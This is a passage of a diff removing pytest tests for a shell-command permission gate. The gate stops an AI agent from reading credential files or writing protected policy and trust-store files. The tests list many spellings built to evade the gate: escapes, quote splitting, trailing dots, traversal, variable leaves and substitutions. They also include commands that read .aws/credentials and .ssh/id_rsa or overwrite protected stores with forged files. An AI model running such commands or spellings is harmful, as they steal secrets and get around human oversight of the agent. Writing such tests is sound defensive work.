-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " type " + tail) is not None
-            ), tail
-
-    def test_drive_relative_benign_target_still_allowed(self) -> None:
-        """The drive prefix widens the boundary, not the fenced set."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type C:src" + self.BS + "main.py"
-            )
-            is None
-        )
-
-    def test_delayed_expansion_needs_the_fenced_target(self) -> None:
-        """Naming the home variable is not itself the signal -- the read is."""
-        for benign in (
-            "cd ~ " + self.AMP + " echo !USERPROFILE!",
-            "cd !USERPROFILE! " + self.AMP + " type README.md",
-        ):
-            assert security.is_sensitive_bash_command(benign) is None, benign
-
-    def test_drive_relative_tail_still_needs_the_home_entry(self) -> None:
-        """`cd ~/project` is not home, and the drive prefix does not change that."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~/project " + self.AMP + " type C:.aws" + self.BS + "credentials"
-            )
-            is None
-        )
-
-    def test_switch_with_a_separate_value_still_finds_the_target(self) -> None:
-        """`Set-Location -ErrorAction Stop ~` -- the switch value is its own token.
-
-        A PowerShell parameter can take its value space-separated, so the flag has
-        to be allowed to carry a following word. The risk that creates is the
-        opposite one: the value group swallowing the target. It cannot, because a
-        successful match still requires the target and the optional group
-        backtracks out of the way -- which is what the no-value case below pins.
-        """
-        for entry in (
-            "Set-Location -ErrorAction Stop ~",
-            "Set-Location -ErrorAction:Stop ~",
-            "Set-Location -Force ~",
-            "Set-Location ~",
-        ):
-            assert (
-                security.is_sensitive_bash_command(entry + " | Get-Content .aws/credentials")
-                is not None
-            ), entry
-
-    def test_switch_value_does_not_invent_a_home_entry(self) -> None:
-        """A non-home target stays a non-home target however many switches precede it."""
-        assert (
-            security.is_sensitive_bash_command(
-                "Set-Location -ErrorAction Stop /tmp | Get-Content .aws/credentials"
-            )
-            is None
-        )
-
-    def test_resolved_home_separators_are_interchangeable(self) -> None:
-        """`C:/Users/u` and `C:\\Users\\u` are the same directory to every Windows shell.
-
-        This used to need a helper that rewrote separators inside an escaped
-        pattern. Normalization makes it structural: both spellings shape to the
-        same segments, so there is nothing left to keep in sync.
-        """
-        assert security._shape_path_token("C:" + self.BS + "Users" + self.BS + "u") == (
-            security._shape_path_token("C:/Users/u")
-        )
-        # A separator is still a separator, not a wildcard: a different character
-        # there is a different path.
-        assert security._shape_path_token("C:xUsersxu") != (
-            security._shape_path_token("C:/Users/u")
-        )
-
-    def test_noop_traversal_chain_is_the_same_file(self) -> None:
-        """`project\\..\\.aws\\credentials` names exactly `.aws\\credentials`."""
-        for tail in (
-            "project" + self.BS + ".." + self.BS + ".aws" + self.BS + "credentials",
-            "project/../.aws/credentials",
-            "a" + self.BS + ".." + self.BS + "b" + self.BS + ".." + self.BS + ".aws/credentials",
-            "./project" + self.BS + ".." + self.BS + ".ssh/id_" + "rsa",
-        ):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " type " + tail) is not None
-            ), tail
-
-    def test_traversal_that_leaves_the_directory_is_not_this_scan(self) -> None:
-        """A chain is consumed only when it provably returns where it started.
-
-        `project\\..\\..\\.aws` resolves ABOVE the shell's directory, so it is a
-        different file and denying it would be denying something this scan has no
-        claim on. The cancelled segment may therefore not itself be `..`.
-        """
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ "
-                + self.AMP
-                + " type project"
-                + self.BS
-                + ".."
-                + self.BS
-                + ".."
-                + self.BS
-                + ".aws"
-                + self.BS
-                + "credentials"
-            )
-            is None
-        )
-
-    def test_noop_traversal_needs_a_fenced_target(self) -> None:
-        """The chain widens the prefix, not the fenced set."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + " type project" + self.BS + ".." + self.BS + "notes.txt"
-            )
-            is None
-        )
-
-    def test_traversal_prefix_does_not_backtrack_catastrophically(self) -> None:
-        """A `+` nested in a `*` is where a regex denial-of-service would live.
-
-        Each iteration is rigidly delimited -- one greedy run bounded by
-        separators, then a literal `\\..\\` -- so there is only one way to split
-        it and the near-miss below cannot blow up.
-        """
-        near_miss = "cd ~ " + self.AMP + " type " + ("a" + self.BS + ".." + self.BS) * 60 + "x"
-        started = time.perf_counter()
-        assert security.is_sensitive_bash_command(near_miss) is None
-        assert time.perf_counter() - started < 1.0
-
-    def test_bare_parent_is_not_a_cancelling_chain(self) -> None:
-        """A `..` that climbs above the starting directory names a different file.
-
-        Under the old pattern this was a guard nothing could observe, because an
-        earlier pass already denied the same string. Normalization makes it a
-        property of the shape itself: the path is marked as having ESCAPED, which
-        is why it can be excluded on principle rather than by pattern.
-        """
-        for spelling in (
-            ".." + self.BS + ".." + self.BS + ".aws" + self.BS + "credentials",
-            "../../.aws/credentials",
-            "project" + self.BS + ".." + self.BS + ".." + self.BS + ".aws",
-        ):
-            assert security._shape_path_token(spelling).escaped is True, spelling
-        # The cancelling forms return to where they started, so they are NOT
-        # escaped and DO name the fenced path -- one function, both answers.
-        for cancelling in (
-            "project" + self.BS + ".." + self.BS + ".aws" + self.BS + "credentials",
-            "a" + self.BS + "b" + self.BS + ".." + self.BS + ".." + self.BS + ".aws",
-            "a/b/c/../../../.aws/credentials",
-            "." + self.BS + ".aws" + self.BS + "credentials",
-        ):
-            shape = security._shape_path_token(cancelling)
-            assert shape.escaped is False, cancelling
-            assert security._fenced_relative_prefix(shape) == ".aws", cancelling
-
-    def test_trailing_dot_on_a_fenced_component_is_the_same_directory(self) -> None:
-        """Windows drops trailing dots and spaces from every path component.
-
-        So `.aws.` and `.aws` are one directory, and `type .aws.\\credentials` after
-        entering home really does read the credential. A whole-segment comparison
-        without this rule lets one trailing dot walk past EVERY fenced entry at
-        once, which is why it is normalized rather than enumerated.
-
-        Found by an adversarial review of the rewrite, not by a reviewer bot.
-        """
-        for tail in (
-            ".aws." + self.BS + "credentials",
-            ".aws..." + self.BS + "credentials",
-            ".ssh." + self.BS + "id_" + "rsa",
-            ".npmrc.",
-            ".config" + self.BS + "gcloud." + self.BS + "x",
-        ):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " type " + tail) is not None
-            ), tail
-
-    def test_dot_only_segments_keep_their_meaning(self) -> None:
-        """Stripping padding must not eat `.` or `..`, which are navigation.
-
-        If the padding rule applied to a dot-only segment it would erase the
-        netting that decides whether a path escapes its directory -- and that would
-        silently turn every escaping traversal back into a fenced match.
-        """
-        assert security._strip_windows_component_padding("..") == ".."
-        assert security._strip_windows_component_padding(".") == "."
-        assert security._strip_windows_component_padding(".aws.") == ".aws"
-        assert security._strip_windows_component_padding(".aws ") == ".aws"
-        # And the invariant it protects still holds end to end.
-        assert (
-            security._shape_path_token(
-                "project" + self.BS + ".." + self.BS + ".." + self.BS + ".aws"
-            ).escaped
-            is True
-        )
-
-    def test_a_name_split_across_a_quote_is_rejoined(self) -> None:
-        """`.aw"s\\credentials"` is ONE argument to cmd.exe, so it must read as one.
-
-        Quotes are skipped rather than treated as word boundaries. A boundary tore
-        the fenced name into `.aw` and `s\\credentials`, neither of which matches
-        anything -- while the shell would hand the program the joined path.
-        """
-        for spelling in (
-            "type .aw" + self.DQ + "s" + self.BS + "credentials" + self.DQ,
-            "type " + self.DQ + ".aws" + self.DQ + self.BS + "credentials",
-            "type .aws" + self.DQ + self.BS + "credentials" + self.DQ,
-            "type '.aw's" + self.BS + "credentials",
-        ):
-            assert (
-                security.is_sensitive_bash_command("cd ~ " + self.AMP + " " + spelling) is not None
-            ), spelling
-
-    def test_skipping_quotes_does_not_fuse_separate_arguments(self) -> None:
-        """Whitespace still ends a word, so quoted arguments stay separate."""
-        assert [w for _o, w, _n in security._native_words('echo "a" "b"')] == [
-            "echo",
-            "a",
-            "b",
-        ]
-        assert [w for _o, w, _n in security._native_words('cd /d "%USERPROFILE%"')] == [
-            "cd",
-            "/d",
-            "%USERPROFILE%",
-        ]
-
-    def test_powershell_backtick_escape_is_read_like_the_caret(self) -> None:
-        """PowerShell escapes with a backtick, cmd.exe with a caret.
-
-        The rewrite closed the caret and left this one open -- the same omission,
-        one shell over, and the reason both now live in the word layer instead of
-        being handled per-shell. The backtick is deliberately not an operator here
-        even though bash reads it as command substitution: this is the
-        native-Windows pass, and bash's substitution is the segment splitter's job.
-        """
-        for spelling in (
-            "cd ~ " + self.AMP + " type .aw" + self.BT + "s" + self.BS + "credentials",
-            "c" + self.BT + "d ~ " + self.AMP + " type .aws" + self.BS + "credentials",
-            "cd %USER" + self.BT + "PROFILE% " + self.AMP + " type .aws" + self.BS + "credentials",
-        ):
-            assert security.is_sensitive_bash_command(spelling) is not None, spelling
-
-    def test_a_home_directory_containing_a_space(self) -> None:
-        """`C:\\Users\\John Doe` is an ordinary Windows home, quoted or not.
-
-        Quoted, the space belongs to the path. UNQUOTED it still does, because
-        cmd.exe's `cd` takes the rest of the line as its argument -- which is why
-        the target search also tries the running join of the words it has seen.
-        """
-        home = "C:" + self.BS + "Users" + self.BS + "John Doe"
-        with mock.patch.object(security.Path, "home", staticmethod(lambda: Path(home))):
-            for entry in (
-                'cd /d "' + home + '"',
-                "cd /d " + home,
-                'cd /d "c:' + self.BS + "users" + self.BS + 'john doe"',
-            ):
-                assert (
-                    security.is_sensitive_bash_command(
-                        entry + " " + self.AMP + " type .aws" + self.BS + "credentials"
-                    )
-                    is not None
-                ), entry
-
-    def test_the_resolved_home_comparison_is_case_insensitive(self) -> None:
-        """Windows paths are case-insensitive, and this was the one compare that was not.
-
-        The fenced-segment compare and the anchor pattern already fold, so a
-        case-varied spelling of the resolved home was the single remaining way to
-        miss an entry by capitalisation alone.
-        """
-        home = "C:" + self.BS + "Users" + self.BS + "U"
-        with mock.patch.object(security.Path, "home", staticmethod(lambda: Path(home))):
-            for spelling in ("c:/users/u", "C:" + self.BS + "uSeRs" + self.BS + "U"):
-                assert security._names_home_directory(spelling) is True, spelling
-            assert security._names_home_directory("C:" + self.BS + "Users" + self.BS + "V") is False
-
-    def test_any_number_of_parameters_may_precede_the_target(self) -> None:
-        """A bounded window on target candidates was wrong for a nameable reason.
-
-        A PowerShell parameter can take its value as a separate word, so an
-        arbitrary number of words can sit between the verb and its positional
-        target. Any cap stops short of some legitimate spelling, so the whole
-        operator-delimited run is scanned instead.
-        """
-        assert (
-            security.is_sensitive_bash_command(
-                "Set-Location -ErrorAction Stop -WarningAction Stop -Verbose ~"
-                " | Get-Content .aws/credentials"
-            )
-            is not None
-        )
-        # An operator still ends the run, which is what stops the scan reaching a
-        # `~` that belongs to a different command. Here the shell is in /tmp, so
-        # `.aws/credentials` resolves under /tmp and is not the fenced store.
-        assert security.is_sensitive_bash_command("cd /tmp ; echo ~ ; cat .aws/credentials") is None
-
-    def test_a_fenced_entry_containing_a_space(self) -> None:
-        """Two fenced entries have a space in them, so a word cannot end at one."""
-        assert (
-            security.is_sensitive_bash_command(
-                "cd ~ " + self.AMP + ' type "Library/Application Support/kiro-cli/x"'
-            )
-            is not None
-        )
-
-    def test_a_quoted_region_yields_both_readings(self) -> None:
-        """Quoted whitespace is ambiguous, so the scan takes the path AND the parts.
-
-        `"C:\\Users\\John Doe"` is one path; `cmd /C "cd ~ & type .aws\\credentials"`
-        is a command line that must still be cut apart. Nothing in the text says
-        which, so both readings are emitted -- sound only because the scan is
-        monotone, where an extra reading can add a denial but never remove one.
-        """
-        words = [w for _o, w, _n in security._native_words('a "b c" d')]
-        assert "b" in words and "c" in words and "b c" in words
-        # The nested-command reading is what the joined-only form would have lost.
-        assert (
-            security.is_sensitive_bash_command(
-                'cmd /V:ON /C "cd /d !USERPROFILE! '
-                + self.AMP
-                + " type .aws"
-                + self.BS
-                + 'credentials"'
-            )
-            is not None
-        )
-
-    def test_verb_alternation_tracks_the_shared_set(self) -> None:
-        """The scan reads `_CHDIR_VERBS`, so a new spelling needs one edit not two."""
-        for verb in security._CHDIR_VERBS:
-            assert security.is_sensitive_bash_command(
-                verb + " ~ " + self.AMP + " cat .aws/credentials"
-            ), verb
-
-    def test_home_target_spellings_match_the_absolute_pass(self) -> None:
-        """Drift guard: every anchor the absolute pass accepts also anchors an entry.
-
-        `_HOME_TARGET_ALT`, `_WINDOWS_HOME_ANCHOR_RE` and the `userprofile` group
-        inside `_build_sensitive_regex` are three lists of the same thing; pin
-        them to one set so a spelling added to one is not missing from another.
-        """
-        anchors = (
-            "~",
-            "$HOME",
-            "%USERPROFILE%",
-            "%HOMEDRIVE%%HOMEPATH%",
-            "$env:USERPROFILE",
-            "${env:USERPROFILE}",
-            "$env:HOMEDRIVE$env:HOMEPATH",
-            "${env:HOMEDRIVE}${env:HOMEPATH}",
-        )
-        for anchor in anchors:
-            # Absolute spelling: the anchor names the fenced path outright.
-            assert security.is_sensitive_bash_command(
-                "type " + anchor + "/.aws/credentials"
-            ), anchor
-            # Entry spelling: the anchor is the chdir target, the tail relative.
-            assert security.is_sensitive_bash_command(
-                "cd " + anchor + " " + self.AMP + " type .aws/credentials"
-            ), anchor
-
-
-class TestKeystoneVariableLeafNativeSpellings:
-    """A variable LEAF under the keystone, spelled the way Windows spells paths.
-
-    ``~/.kiro/crew`` is not fenced as a directory -- only its leaves are -- so a
-    read whose filename is a variable (``cat "$HOME/.kiro/crew/$F"``) can only be
-    caught by asking whether the DIRECTORY holds a protected leaf. That rule
-    existed and worked, but it cut the directory off the token by splitting on
-    ``/`` alone: with the separators Windows actually uses, the cut landed on
-    ``/Users`` and the keystone's own directory was never the thing tested.
-
-    Every spelling here reads ``token_signing.key``, ``.local_secret``,
-    ``sel_hmac.key`` and ``security_policy.json`` -- the files AGENTS.md says the
-    agent can neither read nor write, and the reason the ceiling is not
-    self-disableable. Parametrised over the anchors and both separators rather
-    than spot-checked, because the bug was one missing separator in one branch and
-    the forward-slash spelling of the same attack was already covered.
-    """
-
-    ANCHORS = (
-        "$HOME",
-        "%USERPROFILE%",
-        "!USERPROFILE!",
-        "$env:USERPROFILE",
-        "${env:USERPROFILE}",
-    )
-    CREW_HOMES = (".kiro/crew", ".kirocrew")
-
-    @pytest.mark.parametrize("anchor", ANCHORS)
-    @pytest.mark.parametrize("crew", CREW_HOMES)
-    @pytest.mark.parametrize("sep", ("/", "\\"))
-    @pytest.mark.parametrize(
-        "leaf",
-        (
-            "$F",
-            "%F%",
-            "!F!",
-            "${F}",
-            # Computed leaves. The value cannot be read from the command text, so the
-            # only safe reading is that it might name a keystone file. Omitting these
-            # let `…\.kiro\crew\$(Write-Output security_policy.json)` read the
-            # governance policy unquoted, because the token-level rule that does
-            # recognise a substitution only sees a QUOTED path.
-            "$(Write-Output security_policy.json)",
-            "$(a $(b))",
-            "@(Get-Item x)",
-            "`printf token_signing.key`",
-            # Nested past whatever depth a body could describe. A pattern that models
-            # the CONTENTS of a bracketing form can always be out-nested, which is why
-            # these match the opener instead: a body permitting one level allowed
-            # `$(a $(b $(c)))` through.
-            "$(a $(b $(c)))",
-            "@(a @(b @(c)))",
-            # A PowerShell variable name may legally contain a space, so a body of
-            # `[^}\\s]+` excluded exactly the spelling an attacker would reach for.
-            "${My Var}",
-            "${env:My Var}",
-            # An opener with no closer at all. A deny gate has no reason to require
-            # one, and requiring it is another way to describe a body.
-            "$(",
-        ),
-    )
-    def test_variable_leaf_under_the_keystone_is_refused(
-        self, anchor: str, crew: str, sep: str, leaf: str
-    ) -> None:
-        path = f"{anchor}{sep}{crew.replace('/', sep)}{sep}{leaf}"
-        for verb in ("cat", "type", "Get-Content"):
-            assert security.is_sensitive_bash_command(f"{verb} {path}"), path
-            assert security.is_sensitive_bash_command(f'{verb} "{path}"'), path
-
-    def test_an_absolute_home_spelled_with_backslashes_is_refused(self) -> None:
-        """The shape that made this a real bypass rather than a theoretical one.
-
-        `normalize_shell_command` expands ``$HOME`` before the rule runs, so the
-        token the rule actually sees is an absolute POSIX home followed by
-        backslash separators. Splitting on ``/`` cut that at ``/Users`` -- a
-        directory holding no protected leaf -- so the read was allowed.
-        """
-        home = os.path.expanduser("~")
-        assert security.is_sensitive_bash_command(f"type {home}\\.kiro\\crew\\$F")
-        assert security.is_sensitive_bash_command(f"type {home}\\.kirocrew\\$F")
-
-    def test_a_windows_drive_home_with_a_variable_leaf_is_refused(self) -> None:
-        assert security.is_sensitive_bash_command("type C:\\Users\\me\\.kiro\\crew\\%F%")
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            'D=$HOME; cat "$D\\.kiro\\crew\\$F"',
-            'D=$HOME; cat "$D/.kiro/crew/$F"',
-            'export D=$HOME; type "$D\\.kirocrew\\$F"',
-            'D=$HOME/.kiro; cat "$D\\crew\\$F"',
-        ),
-    )
-    def test_a_home_held_in_a_tracked_variable_is_refused(self, command: str) -> None:
-        """The shape the raw-text pass cannot see, so only the token rule can catch it.
-
-        Every native-spelling branch in `_build_sensitive_regex` needs a literal
-        home ANCHOR in the command text. Assigning the home to a variable first
-        removes it: the raw text carries ``$D``, which no anchor alternation
-        matches. What resolves the path is the segment walk substituting the value
-        the command assigned itself -- and the token the walk then hands over is an
-        absolute home followed by whichever separator was typed, which is precisely
-        why the directory cut has to honour both.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            'cat "$UNKNOWN/.kiro/crew/$F"',
-            'cat "$UNKNOWN\\.kiro\\crew\\$F"',
-            'cat "$(get_home)/.kiro/crew/$F"',
-            'cat "${SOMEDIR}/.kirocrew/$F"',
-        ),
-    )
-    def test_an_unrecognised_anchor_with_a_variable_leaf_is_refused(self, command: str) -> None:
-        """Both ends unresolvable: nothing in the text names the home OR the leaf.
-
-        The anchor is a variable the command never assigned (or a substitution whose
-        value needs the command to run), so there is no literal prefix to take a
-        directory from and no anchor for any raw-text branch to match. What closes
-        it is testing the home HYPOTHESIS as a directory: if the unresolved anchor
-        were a home, the path would name the keystone's own directory, so the leaf
-        variable could name a protected file and the read is refused.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_nested_keystone_directories_are_covered_too(self) -> None:
-        """The rule is derived from the fenced list, not from a hand-written path."""
-        assert security.is_sensitive_bash_command(
-            "type %USERPROFILE%\\.kiro\\crew\\apps\\aws-control\\%F%"
-        )
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            'cat "$HOME/logs/$F"',
-            "cat $BUILD/out.txt",
-            "ls ~/Documents/$F",
-            "cat ~/project/src/$MODULE.py",
-            'grep -r "$PATTERN" ~/code/',
-            # A backslash is a legal POSIX filename character, so folding
-            # separators must not turn an odd filename into a keystone read.
-            'cat "$HOME/weird\\name/$F"',
-            # Reachable subdirectories of the crew home stay reachable: only the
-            # directories whose sensitivity lives in their leaves are fenced.
-            "cat ~/.kiro/crew/skills/$NAME/SKILL.md",
-            "cat ~/.kiro/crew/workspace/$PROJ/notes.md",
-            # The anchors must not fire on a lookalike or a bare echo.
-            "echo %USERPROFILE%\\Desktop\\%FILE%",
-            "echo !MYVAR!",
-            "cd %USERPROFILE%\\src",
-            # A general-purpose directory whose variable-leaf spelling is ordinary.
-            "type %APPDATA%\\%MYAPP%\\config.ini",
-            # The opener-only bracketing forms are anchored to the keystone's own
-            # directory, so a substitution anywhere else stays ordinary. Pinned
-            # because matching an opener is the widest of the alternations and is
-            # the one whose false-positive cost would be felt everywhere.
-            "echo $(date)",
-            "cd $(git rev-parse --show-toplevel)",
-            "cat ~/.kiro/crew/skills/$(ls)/SKILL.md",
-            "echo ${My Var}",
-            "type %APPDATA%\\$(x)\\config.ini",
-            # A substitution is only a signal UNDER the keystone; on its own it is how
-            # ordinary shell scripting works.
-            "echo $(date)",
-            "cat ~/logs/$(ls -1 | head -1)",
-            "echo `date`",
-            "type %LOCALAPPDATA%\\%VENDOR%\\cache",
-        ),
-    )
-    def test_benign_variable_leaves_are_still_allowed(self, command: str) -> None:
-        """Fencing on the parent directory must not fence every variable leaf."""
-        assert security.is_sensitive_bash_command(command) is None, command
-
-
-class TestWindowsPathShapes:
-    """Native Windows path spellings must be recognized as path-like so the
-    normalizer pass routes them through is_sensitive_path() -- on Windows
-    hosts the fence targets are os.sep-joined, and a backslash spelling that
-    never reaches the check would leave every fenced dir shell-reachable.
-    Recognition is limited lexically to the drive/share holding Path.home():
-    every fenced target lives under home, and a foreign-drive token would only
-    feed realpath a disconnected mapped drive or dead UNC host (a synchronous
-    network stall on the permission gate)."""
-
-    def test_home_drive_paths_are_path_like(self) -> None:
-        from unittest.mock import patch
-
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert security._is_path_like("C:\\Users\\u\\.aws\\credentials")
-            assert security._is_path_like("c:/Users/u/.aws/credentials")
-
-    def test_foreign_drive_and_unc_are_not_probed(self, monkeypatch) -> None:
-        # A pure-backslash token on another drive/share gains no NEW
-        # recognition; treating it as path-like would only cost a realpath
-        # probe of a possibly-dead network target.
-        from unittest.mock import patch
-
-        monkeypatch.delenv("KIROCREW_HOME", raising=False)
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert not security._is_path_like("Z:\\stale\\mapped\\drive")
-            assert not security._is_path_like("\\\\dead-server\\share\\x")
-
-    def test_cross_drive_forward_slash_token_stays_path_like(self) -> None:
-        # KIROCREW_HOME may legitimately live on another drive, and its
-        # keystone leaves are re-anchored there. A forward-slash spelling was
-        # path-like via the generic "/" branch before drive shapes were
-        # recognized -- the foreign-drive check must FALL THROUGH to it, not
-        # intercept it, or the governance ceiling on that drive becomes
-        # shell-reachable.
-        from unittest.mock import patch
-
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert security._is_path_like("D:/kirocrew/security_policy.json")
-
-    def test_kirocrew_home_drive_anchors_backslash_recognition(self, monkeypatch) -> None:
-        # A BACKSLASH spelling under a cross-drive KIROCREW_HOME must also be
-        # recognized: the keystone leaves are re-anchored under that root, so
-        # its drive is an anchor alongside the user home's.
-        from unittest.mock import patch
-
-        monkeypatch.setenv("KIROCREW_HOME", "D:\\crew")
-        with patch.object(security.Path, "home", return_value=Path("C:\\Users\\u")):
-            assert security._is_path_like("D:\\crew\\security_policy.json")
-            # Drives matching NEITHER root stay unrecognized (no realpath probe).
-            assert not security._is_path_like("Z:\\stale\\mapped\\drive")
-
-    def test_unc_home_share_is_path_like(self, monkeypatch) -> None:
-        from unittest.mock import patch
-
-        monkeypatch.delenv("KIROCREW_HOME", raising=False)
-        with patch.object(security.Path, "home", return_value=Path("\\\\srv\\homes\\u")):
-            assert security._is_path_like("\\\\srv\\homes\\u\\.aws\\credentials")
-            assert not security._is_path_like("\\\\other\\share\\x")
-            # A share that merely extends the name past the segment boundary
-            # is a DIFFERENT share -- probing it would realpath a possibly
-            # dead SMB target.
-            assert not security._is_path_like("\\\\srv\\homes-dead\\share\\x")
-
-    def test_backslash_relative_is_path_like(self) -> None:
-        assert security._is_path_like(".\\x\\y")
-        assert security._is_path_like("..\\x\\y")
-
-    def test_drive_shapes_are_inert_on_posix_homes(self, monkeypatch) -> None:
-        # With a POSIX home and no drive-lettered KIROCREW_HOME, no anchor
-        # root has a drive, so drive/UNC tokens are not path-like at all --
-        # no behavior change for POSIX workflows. (KIROCREW_HOME must be
-        # cleared: on Windows CI it is a drive-lettered path and a legitimate
-        # anchor root.)
-        from unittest.mock import patch
-
-        monkeypatch.delenv("KIROCREW_HOME", raising=False)
-        with patch.object(security.Path, "home", return_value=Path("/home/u")):
-            assert not security._is_path_like("C:\\Users\\u\\.aws\\credentials")
-            assert not security._is_path_like("\\\\server\\share\\x")
-
-    def test_non_path_tokens_stay_non_path_like(self) -> None:
-        # ``key:value`` option tokens and URLs must not become path-like --
-        # the drive-letter form requires a separator right after the colon.
-        assert not security._is_path_like("key:value")
-        assert not security._is_path_like("C:no-separator")
-        assert not security._is_path_like("https://x.example/a")
-
-    def test_native_spelling_is_blocked_in_raw_text_on_any_host(self) -> None:
-        # The raw regex pass sees the command BEFORE tokenization, so it is
-        # the only layer that can catch an embedded interpreter script or a
-        # quoted native spelling -- and it is host-independent, so these must
-        # block everywhere, not just on Windows runners.
-        cmds = [
-            "python -c \"open(r'C:\\Users\\u\\AppData\\Roaming\\kiro-cli\\data.sqlite3','w')\"",
-            "python -c \"open(r'C:\\Users\\u\\.aws\\credentials')\"",
-            "type 'C:\\Users\\u\\.ssh\\id_rsa'",
-            "cat '%USERPROFILE%\\.aws\\credentials'",
-            "type '\\\\srv\\homes\\u\\.ssh\\id_rsa'",
-            "type 'C:/Users/u/.aws/credentials'",
-            # PowerShell spelling of the profile variable.
-            "Get-Content '$env:USERPROFILE\\.aws\\credentials'",
-            # cmd.exe expansion-modifier spelling.
-            "type '%USERPROFILE:~0%\\.ssh\\id_rsa'",
-            # Braced PowerShell spelling.
-            "Get-Content '${env:USERPROFILE}\\.aws\\credentials'",
-            # HOMEDRIVE+HOMEPATH concatenation is the same home by definition.
-            'Get-Content "$env:HOMEDRIVE$env:HOMEPATH\\AppData\\Roaming\\kiro-cli\\data.sqlite3"',
-            "type '%HOMEDRIVE%%HOMEPATH%\\.ssh\\id_rsa'",
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("leaf", security._WRITE_PROTECTED_BASH_LEAVES)
-    def test_native_spelling_of_write_protected_leaf_is_blocked_on_any_host(
-        self, leaf: str
-    ) -> None:
-        # The write-protected leaf branch is POSIX-separator anchored, so on a
-        # Windows host the resolved home literal (``C:\Users\u``) spells every
-        # leaf with backslashes and reached the fenced file unblocked. Each leaf
-        # is an input to an authorization decision (the on-call schedule, the
-        # incident index, the alias ownership record, the browse launch config), so
-        # the native spelling has to be gated in the raw text like the fenced
-        # dirs already are -- host-independently, since the raw pass never
-        # depends on the runner's OS.
-        win_leaf = leaf.replace("/", "\\")
-        for prefix in security.crew_home_prefixes():
-            win_prefix = prefix.replace("/", "\\")
-            for anchor in ("C:\\Users\\u", "%USERPROFILE%", "$env:USERPROFILE"):
-                target = f"{anchor}\\{win_prefix}\\{win_leaf}"
-                for cmd in (
-                    f'echo forged > "{target}"',
-                    f'copy /Y evil.json "{target}"',
-                    f"python -c \"open(r'{target}','w')\"",
-                    f'del "{target}"',
-                ):
-                    assert is_sensitive_bash_command(cmd) is not None, cmd
-        # Adding a leaf must not fence the whole crew home: unrelated content in
-        # the same native spelling stays writable.
-        assert (
-            is_sensitive_bash_command('echo x > "C:\\Users\\u\\.kiro\\crew\\sessions.db"') is None
-        )
-
-    def test_appdata_alias_of_fenced_store_is_blocked(self) -> None:
-        # %APPDATA% points INTO AppData\Roaming, so this spelling names the
-        # store without the AppData\Roaming text the home-anchored branch
-        # matches on -- it needs its own alias branch.
-        cmds = [
-            'del "%APPDATA%\\kiro-cli\\data.sqlite3"',
-            "type '%APPDATA%\\amazon-q\\data.sqlite3'",
-            "cat '%APPDATA%/kiro-cli/data.sqlite3'",
-            'del "$env:APPDATA\\kiro-cli\\data.sqlite3"',
-            # Single-dot segments are canonical-equivalent to their absence.
-            'cmd /c copy /Y evil.sqlite "%APPDATA%\\.\\kiro-cli\\data.sqlite3"',
-            # cmd.exe expansion modifiers resolve to the same location.
-            'cmd /c copy "%APPDATA:~0%\\kiro-cli\\data.sqlite3" .\\loot.db',
-            # Braced PowerShell spelling.
-            'del "${env:APPDATA}\\kiro-cli\\data.sqlite3"',
-            # cmd.exe delayed expansion names the same location.
-            'cmd /V:ON /c copy /Y evil.sqlite "!APPDATA!\\kiro-cli\\data.sqlite3"',
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-        # Other %APPDATA% content stays allowed.
-        assert is_sensitive_bash_command('type "%APPDATA%\\SomeApp\\config.json"') is None
-
-    def test_localappdata_alias_of_fenced_store_is_blocked(self) -> None:
-        # %LOCALAPPDATA% points INTO AppData\Local -- where CURRENT kiro-cli
-        # keeps its store, now a trust anchor in kiro_usage_api._CLI_SQLITE_DBS
-        # -- so this spelling names the fenced store without the AppData\Local
-        # text the home-anchored branch matches on. Without its own alias
-        # branch, a shell command could WRITE the very file whose
-        # unwritability the from_cli_store trust claim rests on.
-        cmds = [
-            'del "%LOCALAPPDATA%\\kiro-cli\\data.sqlite3"',
-            "type '%LOCALAPPDATA%\\amazon-q\\data.sqlite3'",
-            "cat '%LOCALAPPDATA%/kiro-cli/data.sqlite3'",
-            'del "$env:LOCALAPPDATA\\kiro-cli\\data.sqlite3"',
-            # A write verb: the exact forgery the trust claim must exclude.
-            'cmd /c copy /Y evil.sqlite "%LOCALAPPDATA%\\kiro-cli\\data.sqlite3"',
-            # Single-dot segments are canonical-equivalent to their absence.
-            'cmd /c copy /Y evil.sqlite "%LOCALAPPDATA%\\.\\kiro-cli\\data.sqlite3"',
-            # cmd.exe expansion modifiers resolve to the same location.
-            'cmd /c copy "%LOCALAPPDATA:~0%\\kiro-cli\\data.sqlite3" .\\loot.db',
-            # Braced PowerShell spelling.
-            'del "${env:LOCALAPPDATA}\\kiro-cli\\data.sqlite3"',
-            # cmd.exe delayed expansion names the same location, with the
-            # same expansion modifiers.
-            'cmd /V:ON /c copy /Y evil.sqlite "!LOCALAPPDATA!\\kiro-cli\\data.sqlite3"',
-            'cmd /V:ON /c type "!LOCALAPPDATA:~0!\\kiro-cli\\data.sqlite3"',
-            # %LOCALAPPDATA% ends in Local, so \..\Local is a canonical no-op.
-            'del "%LOCALAPPDATA%\\..\\Local\\kiro-cli\\data.sqlite3"',
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-        # Other %LOCALAPPDATA% content stays allowed.
-        assert is_sensitive_bash_command('type "%LOCALAPPDATA%\\SomeApp\\config.json"') is None
-        # The home-anchored native spelling of the Local store is fenced too
-        # (via the _SENSITIVE_HOME_DIRS entry, not the alias branch).
-        assert (
